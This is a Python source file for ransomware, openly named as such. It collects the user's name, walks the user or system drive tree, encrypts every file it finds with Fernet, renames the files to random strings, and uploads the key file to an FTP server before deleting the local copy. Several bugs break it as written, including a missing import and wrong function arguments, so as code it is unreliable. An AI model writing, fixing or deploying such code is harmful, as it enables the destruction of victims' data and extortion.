import os
import random
import string
import ftplib
import platform
import subprocess
from cryptography.fernet import Fernet


class Ransomware:
    def __init__(self, 
                 files=[], 
                 directories=[], 
                 files_dict={}, 
                 key=Fernet.generate_key()
                 ) -> None:
        
        get_name1 = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name"
        name = subprocess.run(get_name1, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).decode("utf-8")

        keytxt = f"""
Key:   {key}\n
Name:  {name}\n
Files: {files}\n
Dict:  {files_dict}
"""
        with open("key.txt", "wb") as key_file:
            key_file.write(keytxt)

        key_dir = f"{os.getcwd()}" + "/key.txt"
        self.key_dir = key_dir

        system_name = platform.system()
        if system_name == "Windows":
            directory = "C:/"
        elif system_name == "Darwin":
            directory = "/Users"
        elif system_name == "Linux":
            directory = "/home"
        else:
            directory = "C:/"

        os.chdir(directory)

        self.files = files
        self.directories = directories
        self.key = key
        self.files_dict = files_dict

    def id_generator(self, 
                     size, 
                     chars=string.ascii_lowercase + string.digits
                    ) -> str:
                        
        return ''.join(random.choice(chars) for _ in range(size))


    def files_dir(self, directory) -> None:
        system_dirs = ["Windows", "Program Files", "Program Files (x86)", "System Volume Information", "Boot", "Recovery"]

        for root, dirs, files in os.walk(self, directory):
            # Skip system directories
            if any(system_dir in root for system_dir in system_dirs):
                continue

            for file in files:
                if file == "ransom.py":
                    continue  # Do not encrypt the current file we are working with or the key

                self.files.append(os.path.join(root, file))

            for dir in dirs:
                self.files_dir(os.path.join(root, dir))

    def encrypt_loop(self) -> None:
        for file in self.files:
            with open(file, "rb") as the_file:
                contents = the_file.read()

            cipher_suite = Fernet(self.key)
            contents_encrypted = cipher_suite.encrypt(contents)

            with open(file, "wb") as the_file:
                the_file.write(contents_encrypted)
            
            # Verification step
            with open(file, "rb") as the_file:
                contents_encrypted = the_file.read()
        
            try:
                contents_decrypted = cipher_suite.decrypt(contents_encrypted)
                if contents == contents_decrypted:
                    print(f"File {file} was successfully encrypted and verified.")
                else:
                    print(f"File {file} encryption verification failed.")

            except InvalidToken:
                print(f"Could not decrypt file: {file}")
            
            except IOError:
                print(f"Could not read file: {file}. Skipping...")
                continue

    def rename_files(self) -> None:
        for _ in self.files:
            if _ == '.DS_Store':
                continue

            name = self.id_generator(random.randint(16, 21))
            ext = "." + self.id_generator(random.randint(7, 10))

            last = f"{name}{ext}"

            self.files_dict.update({last: _})

            os.rename(_, last)

    def send_file_to_ftp(self, 
                         server="", 
                         username="", 
                         password="", 
                         file_path="") -> bytes:
        
        file_path = self.key_dir
        
        ftp = ftplib.FTP(server)
        ftp.login(user=username, passwd=password)
        
        try:
            with open(file_path, 'rb') as file:
                ftp.storbinary(f'STOR {file_path}', file)
        except ftplib.error_perm:
            print("Error: Check your file path")
            return None
        ftp.quit()

        # assure to encrypt key file
        encrypted = Fernet.encrypt(self.key)
        with open(file_path, 'wb') as file:
            file.write(encrypted)
        os.remove(file_path)

starter = Ransomware()
starter.send_file_to_ftp()
starter.files_dir()
starter.encrypt_loop()
starter.rename_files()
